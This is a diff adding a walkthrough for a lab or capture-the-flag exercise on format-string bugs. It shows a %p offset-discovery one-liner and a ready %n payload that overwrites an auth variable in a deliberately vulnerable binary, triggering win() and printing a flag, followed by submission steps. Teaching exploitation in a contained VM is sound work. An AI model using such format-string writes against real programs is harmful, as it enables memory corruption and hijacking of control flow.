@@ -177,3 +177,48 @@ scp -P 2222 -i id_rsa p1@localhost:2022CSZ123456-P3.tar.gz .
 ```
 
 ## Problem 4: Trusted Code Reuse
+### Summary
+Goal: Use a format-string bug to flip an auth check and trigger `win()` in `/home/p1/p4/p4`.
+Hint: `printf` is called directly on your input with a pointer argument on the stack.
+
+### Checks (inside VM)
+```bash
+ls -l /home/p1/p4/p4
+file /home/p1/p4/p4
+```
+
+### High-Level Steps
+1. Find the format-string argument offset for your input.
+2. Use `%n` to write `0x1337` into `auth`.
+3. The program switches `fp` to `win()` and prints the flag, also creating `/opt/p4/solved`.
+
+### Example (offset discovery)
+```bash
+python3 - <<'PY' | /home/p1/p4/p4
+print("AAAA." + ".".join("%p" for _ in range(20)))
+PY
+```
+
+### Example (auth overwrite)
+Because `printf` is called as `printf(buf, &auth, dummy)`, you can use positional specifiers:
+```bash
+python3 - <<'PY' | /home/p1/p4/p4
+# 0x1337 = 4919
+print("%2$4919c%1$n")
+PY
+```
+
+Expected output:
+```
+FLAG: <flag-value>
+```
+
+### Submission
+```bash
+ctf-extract P4
+tar -czf 2022CSZ123456-P4.tar.gz flag.txt key.txt
+```
+Copy submission to host:
+```bash
+scp -P 2222 -i id_rsa p1@localhost:2022CSZ123456-P4.tar.gz .
+```
